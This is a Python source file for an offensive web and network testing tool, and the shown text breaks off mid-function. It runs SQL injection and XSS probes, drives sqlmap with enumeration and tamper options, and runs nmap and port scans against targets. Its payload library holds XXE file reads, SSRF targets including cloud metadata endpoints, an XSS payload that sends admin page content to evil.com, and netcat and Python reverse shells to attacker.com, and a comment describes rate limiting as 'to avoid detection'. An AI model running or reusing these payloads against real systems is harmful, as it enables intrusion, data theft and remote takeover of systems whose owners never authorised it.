"""
Elite VAPT Tool Execution System - Function-Based Architecture
Focused implementation for OWASP Top 50 with enterprise-grade security testing
Expert-level penetration testing tools as standalone callable functions
"""

import subprocess
import asyncio
import json
import time
import logging
import os
import requests
import urllib.parse
from typing import Dict, List, Any, Optional, Union
from dataclasses import dataclass
from pathlib import Path
import tempfile
import re
import hashlib
import base64
from urllib.parse import urlparse, parse_qs
from io import StringIO
import sys

# Elite VAPT Stack Imports with availability checks
try:
    import scapy.all as scapy
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    result = subprocess.run(['nmap', '--version'], capture_output=True, check=True, timeout=5)
    NMAP_CLI_AVAILABLE = True
    print("✓ nmap CLI detected and available")
except (subprocess.CalledProcessError, subprocess.TimeoutExpired, FileNotFoundError):
    NMAP_CLI_AVAILABLE = False
    print("⚠ nmap CLI not found - network scanning features will be limited")

try:
    from bs4 import BeautifulSoup
    BEAUTIFULSOUP_AVAILABLE = True
except ImportError:
    BEAUTIFULSOUP_AVAILABLE = False

try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes, serialization
    import jwt as pyjwt
    CRYPTOGRAPHY_AVAILABLE = True
except ImportError:
    CRYPTOGRAPHY_AVAILABLE = False

try:
    import boto3
    from botocore.exceptions import ClientError
    BOTO3_AVAILABLE = True
except ImportError:
    BOTO3_AVAILABLE = False

try:
    import docker
    DOCKER_AVAILABLE = True
except ImportError:
    DOCKER_AVAILABLE = False

try:
    from zapv2 import ZAPv2
    ZAP_AVAILABLE = True
except ImportError:
    ZAP_AVAILABLE = False

# ===== GLOBAL CONFIGURATION =====
VAPT_CONFIG = {
    'timeout': 30,
    'output_dir': './vapt_results',
    'debug': False,
    'max_threads': 10,
    'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

# ===== DATA STRUCTURES =====

@dataclass
class VAPTResult:
    """Standardized result format for all VAPT functions"""
    success: bool
    tool_name: str
    vulnerabilities: List[Dict] = None
    execution_time: float = 0.0
    error: str = ""
    metadata: Dict[str, Any] = None
    business_impact: str = ""
    cvss_score: float = 0.0
    compliance_risk: str = ""

    def __post_init__(self):
        if self.vulnerabilities is None:
            self.vulnerabilities = []
        if self.metadata is None:
            self.metadata = {}

# ===== ELITE PAYLOAD LIBRARIES =====

class PayloadLibrary:
    """Comprehensive attack payload collection for expert-level testing"""
    
    SQL_INJECTION = {
        'critical': [
            "' OR '1'='1' --",
            "'; EXEC xp_cmdshell('whoami'); --",
            "' UNION SELECT 1,@@version,user(),database() --",
            "'; WAITFOR DELAY '0:0:10'; --",
            "' AND (SELECT SUBSTRING(@@version,1,1))='M' --",
            "' AND 1=CONVERT(int,(SELECT @@version)) --",
            "' UNION SELECT null,table_name,null FROM information_schema.tables --",
            "'; INSERT INTO users(username,password) VALUES('hacker','pwned'); --"
        ],
        'bypass': [
            "/**/UNION/**/SELECT",
            "UNI%00ON SEL%00ECT",
            "/*!50000UNION*//*!50000SELECT*/",
            "'/**/OR/**/1=1/**/--",
            "' OR 'x'='x",
            "'/*!*/OR/*!*/1=1/*!*/--",
            "' OR '1'='1'/*",
            "%27%20OR%20%271%27=%271",
            "' OR ASCII(SUBSTRING((SELECT database()),1,1))>64 --"
        ],
        'time_based': [
            "'; IF(1=1) WAITFOR DELAY '0:0:5' --",
            "' AND (SELECT SLEEP(5)) --",
            "' OR (SELECT pg_sleep(5)) --",
            "'; BENCHMARK(5000000,MD5(1)) --"
        ],
        'error_based': [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e)) --",
            "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY CONCAT(version(),floor(rand(0)*2))) --",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1) --"
        ]
    }
    
    XSS_ADVANCED = [
        "<svg/onload=alert('XSS')>",
        "<img src=x onerror=alert('XSS')>",
        "<script>fetch('/admin').then(r=>r.text()).then(d=>fetch('//evil.com?'+btoa(d)))</script>",
        "javascript:alert(document.domain)",
        "<body onload=alert(document.cookie)>",
        "<iframe src=javascript:alert('XSS')></iframe>",
        "<details open ontoggle=alert('XSS')>",
        "<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><path id=</textarea><img onerror=alert('XSS') src=1>",
        "<%2Fscript%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E",
        "<svg><animatetransform onbegin=alert('XSS')>",
        "'><script>alert(String.fromCharCode(88,83,83))</script>",
        "\"><script>alert(/XSS/.source)</script>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>"
    ]
    
    XXE_PAYLOADS = [
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'http://attacker.com/evil.dtd'>]><root>&xxe;</root>",
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'>%xxe;]>",
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///c:/windows/system32/drivers/etc/hosts'>]><root>&xxe;</root>",
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/etc/passwd'>]><root>&xxe;</root>"
    ]
    
    SSRF_TARGETS = [
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://localhost:6379",
        "file:///etc/passwd",
        "dict://127.0.0.1:6379/",
        "gopher://127.0.0.1:25/",
        "http://[::1]:80/",
        "http://0177.0.0.1/",
        "http://2130706433/",
        "http://017700000001/"
    ]
    
    COMMAND_INJECTION = [
        "; whoami",
        "&& id",
        "| cat /etc/passwd",
        "; uname -a",
        "`whoami`",
        "$(id)",
        "; curl attacker.com/$(whoami)",
        "|nc -e /bin/sh attacker.com 4444",
        ";python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "&ping -c 4 attacker.com",
        "|nslookup attacker.com"
    ]
    
    JWT_ATTACKS = {
        'none_algorithm': '{"alg":"none","typ":"JWT"}',
        'weak_secrets': ['secret', 'key', 'password', '123456', 'admin', 'test', 'jwt', 'token'],
        'algorithm_confusion': ['HS256', 'RS256', 'ES256', 'none'],
        'critical_claims': ['admin', 'root', 'superuser', 'administrator']
    }
    
    DIRECTORY_TRAVERSAL = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "....\/....\/....\/etc/passwd",
        "%252e%252e%252f",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
    ]
    
    BUSINESS_LOGIC_PAYLOADS = {
        'price_manipulation': ['-1', '0', '0.01', '999999999', '0.00'],
        'quantity_bypass': ['-1', '0', '999999', 'null', ''],
        'workflow_bypass': ['admin', 'true', '1', 'yes', 'approved'],
        'race_condition_targets': ['/transfer', '/purchase', '/vote', '/apply', '/submit']
    }

# ===== UTILITY FUNCTIONS =====

def setup_logging(debug: bool = False) -> logging.Logger:
    """Setup logging for VAPT operations"""
    level = logging.DEBUG if debug else logging.INFO
    logging.basicConfig(
        level=level,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    return logging.getLogger(__name__)

def create_session(proxy: str = None, verify_ssl: bool = False) -> requests.Session:
    """Create configured requests session for security testing"""
    session = requests.Session()
    session.verify = verify_ssl
    session.timeout = VAPT_CONFIG['timeout']
    session.headers.update({
        'User-Agent': VAPT_CONFIG['user_agent']
    })
    
    if proxy:
        session.proxies = {'http': proxy, 'https': proxy}
    
    return session

def extract_url_from_text(text: str) -> Optional[str]:
    """Extract URL from plan or description text"""
    if not text:
        return None
        
    # URL pattern matching
    url_pattern = r'https?://[^\s<>"\']+|(?:www\.)?[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*'
    matches = re.findall(url_pattern, text)
    
    if matches:
        url = matches[0].strip('\'"[]')
        if not url.startswith(('http://', 'https://')):
            url = f"http://{url}"
        return url
    return None

def detect_sql_error(response_text: str) -> bool:
    """Detect SQL errors in HTTP response"""
    sql_errors = [
        'sql syntax', 'mysql', 'oracle', 'postgresql', 'sqlite',
        'syntax error', 'unexpected token', 'division by zero',
        'ORA-', 'MySQL', 'Warning: mysql_', 'valid MySQL result',
        'PostgreSQL query failed', 'Warning: pg_',
        'Microsoft OLE DB Provider', 'SQLServer JDBC Driver',
        'SqlException', 'OracleException', 'sqlite3.OperationalError',
        'SQLSTATE', 'com.mysql.jdbc.exceptions'
    ]
    return any(error in response_text.lower() for error in sql_errors)

def detect_xss_reflection(response_text: str, payload: str) -> bool:
    """Detect XSS payload reflection in response"""
    # Check for direct payload reflection
    if payload in response_text:
        return True
    
    # Check for URL-encoded payload reflection
    encoded_payload = urllib.parse.quote(payload)
    if encoded_payload in response_text:
        return True
    
    # Check for HTML-encoded payload reflection
    html_encoded = payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
    if html_encoded in response_text:
        return True
    
    return False

def calculate_cvss_score(vulnerability_type: str, severity: str) -> float:
    """Calculate CVSS score based on vulnerability type and severity"""
    base_scores = {
        'SQL Injection': {'Critical': 9.8, 'High': 8.5, 'Medium': 6.0},
        'XSS': {'Critical': 8.8, 'High': 7.5, 'Medium': 5.5},
        'XXE': {'Critical': 9.1, 'High': 8.0, 'Medium': 6.5},
        'SSRF': {'Critical': 8.5, 'High': 7.0, 'Medium': 5.0},
        'Command Injection': {'Critical': 9.9, 'High': 8.8, 'Medium': 7.0},
        'JWT Vulnerability': {'Critical': 9.1, 'High': 7.5, 'Medium': 5.5},
        'IDOR': {'Critical': 8.5, 'High': 7.0, 'Medium': 5.0},
        'Open Port': {'Critical': 9.0, 'High': 7.5, 'Medium': 5.0},
        'Information Disclosure': {'Critical': 7.5, 'High': 6.0, 'Medium': 4.0}
    }
    
    return base_scores.get(vulnerability_type, {}).get(severity, 0.0)

def save_results(results: VAPTResult, filename: str = None) -> str:
    """Save VAPT results to file"""
    try:
        results_dir = Path(VAPT_CONFIG['output_dir'])
        results_dir.mkdir(parents=True, exist_ok=True)
        
        if not filename:
            timestamp = int(time.time())
            filename = f"vapt_results_{timestamp}.json"
        
        filepath = results_dir / filename
        
        # Convert dataclass to dict for JSON serialization
        results_dict = {
            'success': results.success,
            'tool_name': results.tool_name,
            'vulnerabilities': results.vulnerabilities,
            'execution_time': results.execution_time,
            'error': results.error,
            'metadata': results.metadata,
            'business_impact': results.business_impact,
            'cvss_score': results.cvss_score,
            'compliance_risk': results.compliance_risk,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(results_dict, f, indent=2, ensure_ascii=False)
        
        return str(filepath)
        
    except Exception as e:
        logging.error(f"Error saving results: {e}")
        return ""

# ===== SQL INJECTION TESTING FUNCTIONS =====

def sql_injection_test(url: str, parameter: str = "id", payload: str = None, 
                      test_type: str = "basic") -> VAPTResult:
    """
    Comprehensive SQL injection testing with multiple techniques
    
    Args:
        url: Target URL to test
        parameter: Parameter name to inject into
        payload: Custom payload (uses default if None)
        test_type: Type of test (basic, advanced, comprehensive)
    
    Returns:
        VAPTResult with vulnerability findings
    """
    start_time = time.time()
    vulnerabilities = []
    
    try:
        session = create_session()
        payloads_to_test = []
        
        # Select payloads based on test type
        if test_type == "basic":
            payloads_to_test = PayloadLibrary.SQL_INJECTION['critical'][:3]
        elif test_type == "advanced":
            payloads_to_test = (PayloadLibrary.SQL_INJECTION['critical'] + 
                              PayloadLibrary.SQL_INJECTION['bypass'][:5])
        else:  # comprehensive
            payloads_to_test = (PayloadLibrary.SQL_INJECTION['critical'] + 
                              PayloadLibrary.SQL_INJECTION['bypass'] + 
                              PayloadLibrary.SQL_INJECTION['time_based'][:3] +
                              PayloadLibrary.SQL_INJECTION['error_based'][:3])
        
        # Use custom payload if provided
        if payload:
            payloads_to_test = [payload]
        
        for test_payload in payloads_to_test:
            # Test GET parameter
            get_result = _test_sql_get_parameter(session, url, parameter, test_payload)
            vulnerabilities.extend(get_result)
            
            # Test POST data if comprehensive
            if test_type == "comprehensive":
                post_result = _test_sql_post_parameter(session, url, parameter, test_payload)
                vulnerabilities.extend(post_result)
            
            # Rate limiting to avoid detection
            time.sleep(0.5)
        
        execution_time = time.time() - start_time
        
        # Calculate business impact
        business_impact = "CRITICAL - Database compromise possible"
        if vulnerabilities:
            max_severity = max([v.get('severity', 'Low') for v in vulnerabilities])
            if max_severity == 'Critical':
                business_impact = "CATASTROPHIC - Complete database access and potential system compromise"
        
        return VAPTResult(
            success=True,
            tool_name="SQL Injection Test",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'url': url,
                'parameter': parameter,
                'test_type': test_type,
                'payloads_tested': len(payloads_to_test)
            },
            business_impact=business_impact,
            cvss_score=max([calculate_cvss_score('SQL Injection', v.get('severity', 'Low')) 
                           for v in vulnerabilities] + [0.0]),
            compliance_risk="PCI DSS, SOX, GDPR violations possible"
        )
        
    except Exception as e:
        return VAPTResult(
            success=False,
            tool_name="SQL Injection Test",
            error=str(e),
            execution_time=time.time() - start_time
        )

def sqlmap_campaign(url: str, options: Dict[str, Any] = None) -> VAPTResult:
    """
    Execute comprehensive SQLMap campaign using local sqlmap-dev
    
    Args:
        url: Target URL for testing
        options: Additional SQLMap options
    
    Returns:
        VAPTResult with detailed findings
    """
    start_time = time.time()
    vulnerabilities = []
    
    try:
        # Check for sqlmap availability
        current_dir = os.getcwd()
        sqlmap_path = os.path.join(current_dir, 'sqlmap-dev', 'sqlmap.py')
        
        if not os.path.exists(sqlmap_path):
            return VAPTResult(
                success=False,
                tool_name="SQLMap Campaign",
                error=f"SQLMap not found at {sqlmap_path}",
                execution_time=time.time() - start_time
            )
        
        # Build comprehensive SQLMap command
        cmd = [
            'python', sqlmap_path,
            '-u', url,
            '--batch',
            '--random-agent',
            '--level=3',
            '--risk=2',
            '--technique=BEUSTQ',
            '--timeout=30',
            '--retries=3',
            '--threads=5',
            '--tamper=space2comment,charencode',
            '--flush-session',
            '--fresh-queries',
            '--answers=quit=N,crack=N,dict=N,continue=Y',
            '--banner',
            '--current-user',
            '--current-db',
            '--dbs',
            '--tables'
        ]
        
        # Add custom options
        if options:
            if options.get('data'):
                cmd.extend(['--data', options['data']])
            if options.get('headers'):
                for header in options['headers']:
                    cmd.extend(['--header', header])
            if options.get('cookie'):
                cmd.extend(['--cookie', options['cookie']])
            if options.get('proxy'):
                cmd.extend(['--proxy', options['proxy']])
        
        # Execute SQLMap
        process = subprocess.run(
            cmd, 
            capture_output=True, 
            text=True, 
            timeout=900,  # 15 minutes
            cwd=current_dir
        )
        
        output = process.stdout
        error_output = process.stderr
        
        # Parse SQLMap results
        vulnerabilities = _parse_sqlmap_output(output, error_output, url)
        
        # Save detailed output
        if output:
            _save_sqlmap_results(output, url)
        
        execution_time = time.time() - start_time
        
        return VAPTResult(
            success=True,
            tool_name="SQLMap Campaign",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'sqlmap_version': 'dev',
                'command_used': ' '.join(cmd[:10]) + '...',
                'output_length': len(output)
            },
            business_impact="CRITICAL - Advanced SQL injection testing completed",
            cvss_score=max([v.get('cvss_score', 0.0) for v in vulnerabilities] + [0.0]),
            compliance_risk="PCI DSS compliance violations"
        )
        
    except subprocess.TimeoutExpired:
        return VAPTResult(
            success=False,
            tool_name="SQLMap Campaign",
            error="SQLMap execution timed out",
            execution_time=time.time() - start_time,
            vulnerabilities=[{
                'type': 'SQL Injection Testing',
                'severity': 'Info',
                'evidence': 'SQLMap scan timed out - target may be protected'
            }]
        )
    except Exception as e:
        return VAPTResult(
            success=False,
            tool_name="SQLMap Campaign",
            error=str(e),
            execution_time=time.time() - start_time
        )

def _test_sql_get_parameter(session: requests.Session, url: str, 
                           parameter: str, payload: str) -> List[Dict]:
    """Test SQL injection in GET parameters"""
    vulnerabilities = []
    
    try:
        # Construct test URL
        test_url = f"{url}?{parameter}={urllib.parse.quote(payload)}"
        response = session.get(test_url)
        
        # Analyze response
        if detect_sql_error(response.text):
            vulnerabilities.append({
                'type': 'SQL Injection',
                'severity': 'Critical',
                'location': 'GET parameter',
                'parameter': parameter,
                'payload': payload,
                'evidence': 'SQL error detected in response',
                'cvss_score': 9.8,
                'url': test_url,
                'response_code': response.status_code
            })
        
        # Check for time-based injection
        if 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper():
            if response.elapsed.total_seconds() > 4:
                vulnerabilities.append({
                    'type': 'Time-based SQL Injection',
                    'severity': 'Critical',
                    'location': 'GET parameter',
                    'parameter': parameter,
                    'payload': payload,
                    'evidence': f'Response delayed by {response.elapsed.total_seconds():.2f} seconds',
                    'cvss_score': 9.5
                })
        
    except Exception as e:
        logging.error(f"Error testing SQL GET parameter: {e}")
    
    return vulnerabilities

def _test_sql_post_parameter(session: requests.Session, url: str, 
                            parameter: str, payload: str) -> List[Dict]:
    """Test SQL injection in POST parameters"""
    vulnerabilities = []
    
    try:
        # Test POST data
        post_data = {parameter: payload}
        response = session.post(url, data=post_data)
        
        if detect_sql_error(response.text):
            vulnerabilities.append({
                'type': 'SQL Injection',
                'severity': 'Critical',
                'location': 'POST parameter',
                'parameter': parameter,
                'payload': payload,
                'evidence': 'SQL error detected in POST response',
                'cvss_score': 9.8,
                'response_code': response.status_code
            })
        
    except Exception as e:
        logging.error(f"Error testing SQL POST parameter: {e}")
    
    return vulnerabilities

def _parse_sqlmap_output(output: str, error_output: str, url: str) -> List[Dict]:
    """Parse SQLMap output for vulnerabilities"""
    vulnerabilities = []
    
    try:
        lines = output.split('\n')
        
        # Check for SQL injection detection
        if any(phrase in output.lower() for phrase in [
            'is vulnerable', 'sqlmap identified', 'injection found',
            'parameter is vulnerable', 'payload worked'
        ]):
            injection_technique = 'Unknown'
            dbms_type = 'Unknown'
            
            for line in lines:
                line = line.strip()
                
                # Extract injection technique
                if 'technique:' in line.lower():
                    injection_technique = line.split(':', 1)[1].strip()
                elif any(tech in line.lower() for tech in ['boolean-based', 'error-based', 'union query', 'time-based']):
                    injection_technique = line.strip()
                
                # Extract DBMS information
                if 'back-end dbms:' in line.lower():
                    dbms_type = line.split(':', 1)[1].strip()
            
            vulnerabilities.append({
                'type': 'SQL Injection',
                'severity': 'Critical',
                'tool': 'SQLMap',
                'technique': injection_technique,
                'dbms': dbms_type,
                'url': url,
                'evidence': f'SQLMap confirmed SQL injection using {injection_technique}',
                'cvss_score': 9.8,
                'business_impact': 'Complete database compromise possible'
            })
        
        # Check for database enumeration
        if 'available databases' in output.lower():
            databases = _extract_databases_from_sqlmap_output(output)
            if databases:
                vulnerabilities.append({
                    'type': 'Database Enumeration',
                    'severity': 'High',
                    'tool': 'SQLMap',
                    'databases': databases,
                    'evidence': f'Successfully enumerated {len(databases)} databases',
                    'cvss_score': 8.5
                })
        
        # Check for data exfiltration
        if 'database table entries' in output.lower() or 'dumped table' in output.lower():
            vulnerabilities.append({
                'type': 'Data Exfiltration',
                'severity': 'Critical',
                'tool': 'SQLMap',
                'evidence': 'Successfully extracted sensitive data from database',
                'cvss_score': 9.5,
                'business_impact': 'Sensitive data exposed'
            })
        
        # Check for OS command execution
        if 'os-shell' in output.lower() or 'operating system' in output.lower():
            vulnerabilities.append({
                'type': 'OS Command Execution',
                'severity': 'Critical',
                'tool': 'SQLMap',
                'evidence': 'Potential OS shell access through SQL injection',
                'cvss_score': 10.0,
                'business_impact': 'Complete system compromise'
            })
        
    except Exception as e:
        logging.error(f"Error parsing SQLMap output: {e}")
    
    return vulnerabilities

def _extract_databases_from_sqlmap_output(output: str) -> List[str]:
    """Extract database names from SQLMap output"""
    databases = []
    capture = False
    
    for line in output.split('\n'):
        line = line.strip()
        if 'available databases' in line.lower():
            capture = True
            continue
        elif capture:
            if line.startswith('[') and ']' in line:
                db_name = line.split(']')[0].replace('[', '').strip()
                if db_name and db_name not in ['*', '+', '-']:
                    databases.append(db_name)
            elif not line or line.startswith('[INFO]'):
                capture = False
    
    return databases

def _save_sqlmap_results(output: str, url: str):
    """Save SQLMap results for analysis"""
    try:
        results_dir = Path(VAPT_CONFIG['output_dir'])
        results_dir.mkdir(parents=True, exist_ok=True)
        
        timestamp = int(time.time())
        filename = f"sqlmap_scan_{timestamp}.txt"
        filepath = results_dir / filename
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(f"SQLMap Scan Results\n")
            f.write(f"Target URL: {url}\n")
            f.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"{'='*50}\n\n")
            f.write(output)
        
        logging.info(f"SQLMap results saved to {filepath}")
        
    except Exception as e:
        logging.error(f"Error saving SQLMap results: {e}")

# ===== XSS TESTING FUNCTIONS =====

def xss_test(url: str, parameter: str = "search", payload: str = None, 
             test_type: str = "basic") -> VAPTResult:
    """
    Comprehensive XSS testing with multiple vectors
    
    Args:
        url: Target URL to test
        parameter: Parameter name to inject into
        payload: Custom payload (uses default if None)
        test_type: Type of test (basic, advanced, comprehensive)
    
    Returns:
        VAPTResult with vulnerability findings
    """
    start_time = time.time()
    vulnerabilities = []
    
    try:
        session = create_session()
        payloads_to_test = []
        
        # Select payloads based on test type
        if test_type == "basic":
            payloads_to_test = PayloadLibrary.XSS_ADVANCED[:5]
        elif test_type == "advanced":
            payloads_to_test = PayloadLibrary.XSS_ADVANCED[:10]
        else:  # comprehensive
            payloads_to_test = PayloadLibrary.XSS_ADVANCED
        
        # Use custom payload if provided
        if payload:
            payloads_to_test = [payload]
        
        for test_payload in payloads_to_test:
            # Test GET parameter
            get_result = _test_xss_get_parameter(session, url, parameter, test_payload)
            vulnerabilities.extend(get_result)
            
            # Test POST parameter
            post_result = _test_xss_post_parameter(session, url, parameter, test_payload)
            vulnerabilities.extend(post_result)
            
            # Test in headers if comprehensive
            if test_type == "comprehensive":
                header_result = _test_xss_headers(session, url, test_payload)
                vulnerabilities.extend(header_result)
            
            time.sleep(0.3)  # Rate limiting
        
        execution_time = time.time() - start_time
        
        business_impact = "HIGH - Client-side code execution and session hijacking"
        if vulnerabilities:
            stored_xss = any(v.get('type') == 'Stored XSS' for v in vulnerabilities)
            if stored_xss:
                business_impact = "CRITICAL - Persistent malicious code affecting all users"
        
        return VAPTResult(
            success=True,
            tool_name="XSS Test",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'url': url,
                'parameter': parameter,
                'test_type': test_type,
                'payloads_tested': len(payloads_to_test)
            },
            business_impact=business_impact,
            cvss_score=max([calculate_cvss_score('XSS', v.get('severity', 'Low')) 
                           for v in vulnerabilities] + [0.0]),
            compliance_risk="Data privacy violations, session compromise"
        )
        
    except Exception as e:
        return VAPTResult(
            success=False,
            tool_name="XSS Test",
            error=str(e),
            execution_time=time.time() - start_time
        )

def _test_xss_get_parameter(session: requests.Session, url: str, 
                           parameter: str, payload: str) -> List[Dict]:
    """Test XSS in GET parameters"""
    vulnerabilities = []
    
    try:
        test_url = f"{url}?{parameter}={urllib.parse.quote(payload)}"
        response = session.get(test_url)
        
        if detect_xss_reflection(response.text, payload):
            # Determine if it's reflected or stored
            xss_type = 'Reflected XSS'
            
            # Check if payload is stored by making a second request
            second_response = session.get(url)
            if payload in second_response.text:
                xss_type = 'Stored XSS'
            
            vulnerabilities.append({
                'type': xss_type,
                'severity': 'Critical' if xss_type == 'Stored XSS' else 'High',
                'location': 'GET parameter',
                'parameter': parameter,
                'payload': payload,
                'evidence': 'XSS payload reflected in response',
                'cvss_score': 8.8 if xss_type == 'Stored XSS' else 7.5,
                'url': test_url,
                'response_code': response.status_code
            })
        
    except Exception as e:
        logging.error(f"Error testing XSS GET parameter: {e}")
    
    return vulnerabilities

def _test_xss_post_parameter(session: requests.Session, url: str, 
                            parameter: str, payload: str) -> List[Dict]:
    """Test XSS in POST parameters"""
    vulnerabilities = []
    
    try:
        post_data = {parameter: payload}
        response = session.post(url, data=post_data)
        
        if detect_xss_reflection(response.text, payload):
            vulnerabilities.append({
                'type': 'Reflected XSS',
                'severity': 'High',
                'location': 'POST parameter',
                'parameter': parameter,
                'payload': payload,
                'evidence': 'XSS payload reflected in POST response',
                'cvss_score': 7.5,
                'response_code': response.status_code
            })
        
    except Exception as e:
        logging.error(f"Error testing XSS POST parameter: {e}")
    
    return vulnerabilities

def _test_xss_headers(session: requests.Session, url: str, payload: str) -> List[Dict]:
    """Test XSS in HTTP headers"""
    vulnerabilities = []
    
    headers_to_test = [
        'User-Agent', 'Referer', 'X-Forwarded-For', 
        'X-Real-IP', 'X-Originating-IP', 'Accept-Language'
    ]
    
    for header in headers_to_test:
        try:
            test_headers = {header: payload}
            response = session.get(url, headers=test_headers)
            
            if detect_xss_reflection(response.text, payload):
                vulnerabilities.append({
                    'type': 'Header-based XSS',
                    'severity': 'Medium',
                    'location': f'{header} header',
                    'payload': payload,
                    'evidence': f'XSS payload reflected from {header} header',
                    'cvss_score': 6.0
                })
        except Exception as e:
            logging.error(f"Error testing XSS in {header} header: {e}")
    
    return vulnerabilities

# ===== NETWORK RECONNAISSANCE FUNCTIONS =====

def nmap_scan(target: str, scan_type: str = "basic", ports: str = None) -> VAPTResult:
    """
    Comprehensive nmap network scanning
    
    Args:
        target: Target IP/hostname to scan
        scan_type: Type of scan (basic, service, vuln, comprehensive)
        ports: Custom port specification
    
    Returns:
        VAPTResult with discovered services and vulnerabilities
    """
    start_time = time.time()
    vulnerabilities = []
    
    if not NMAP_CLI_AVAILABLE:
        return VAPTResult(
            success=False,
            tool_name="Nmap Scan",
            error="Nmap CLI not available",
            execution_time=time.time() - start_time
        )
    
    try:
        # Build nmap command based on scan type
        if scan_type == "basic":
            cmd = ['nmap', '-sS', '-T4', '--top-ports', '1000', target]
        elif scan_type == "service":
            cmd = ['nmap', '-sV', '-sC', '--top-ports', '100', target]
        elif scan_type == "vuln":
            cmd = ['nmap', '--script', 'vuln', '--script-timeout', '60s', target]
        else:  # comprehensive
            cmd = ['nmap', '-sS', '-sV', '-sC', '-O', '--script', 'vuln', 
                   '--top-ports', '1000', '-T4', target]
        
        # Add custom ports if specified
        if ports:
            cmd.extend(['-p', ports])
        
        # Execute nmap
        process = subprocess.run(
            cmd, 
            capture_output=True, 
            text=True, 
            timeout=300
        )
        
        output = process.stdout
        vulnerabilities = _parse_nmap_output(output, scan_type, target)
        
        execution_time = time.time() - start_time
        
        return VAPTResult(
            success=True,
            tool_name="Nmap Scan",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'target': target,
                'scan_type': scan_type,
                'command': ' '.join(cmd),
                'output_length': len(output)
            },
            business_impact="Network reconnaissance completed - attack surface identified",
            cvss_score=max([v.get('cvss_score', 0.0) for v in vulnerabilities] + [0.0]),
            compliance_risk="Network exposure assessment"
        )
        
    except subprocess.TimeoutExpired:
        return VAPTResult(
            success=False,
            tool_name="Nmap Scan",
            error="Nmap scan timed out",
            execution_time=time.time() - start_time
        )
    except Exception as e:
        return VAPTResult(
            success=False,
            tool_name="Nmap Scan",
            error=str(e),
            execution_time=time.time() - start_time
        )

def port_scan(host: str, ports: List[int], scan_timeout: int = 5) -> VAPTResult:
    """
    Custom port scanning functionality
    
    Args:
        host: Target host to scan
        ports: List of ports to scan
        scan_timeout: Timeout per port
    
    Returns:
        VAPTResult with open ports
    """
    start_time = time.time()
    vulnerabilities = []
    open_ports = []
    
    try:
        import socket
        
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(scan_timeout)
                result = sock.connect_ex((host, port))
                
                if result == 0:
                    open_ports.append(port)
                    
                    # Assess service risk
                    risk_level = _assess_port_risk(port)
                    if risk_level in ['High', 'Critical']:
                        vulnerabilities.append({
                            'type': 'Open Port',
                            'severity': risk_level,
                            'port': port,
                            'host': host,
                            'evidence': f'Port {port} is open',
                            'cvss_score': 7.5 if risk_level == 'High' else 9.0
                        })
                
                sock.close()
                
            except Exception as e:
                logging.error(f"Error scanning port {port}: {e}")
        
        execution_time = time.time() - start_time
        
        return VAPTResult(
            success=True,
            tool_name="Port Scan",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'host': host,
                'ports_scanned': len(ports),
                'open_ports': open_ports
            },
            business_impact=f"Network exposure: {len(open_ports)} open ports discovered",
            cvss_score=max([v.get('cvss_score', 0.0) for v in vulnerabilities] + [0.0])
        )
        
    except Exception as e:
        return VAPTResult(
            success=False,
            tool_name="Port Scan",
            error=str(e),
            execution_time=time.time() - start_time
        )

def _parse_nmap_output(output: str, scan_type: str, target: str) -> List[Dict]:
    """Parse nmap output for vulnerabilities and services"""
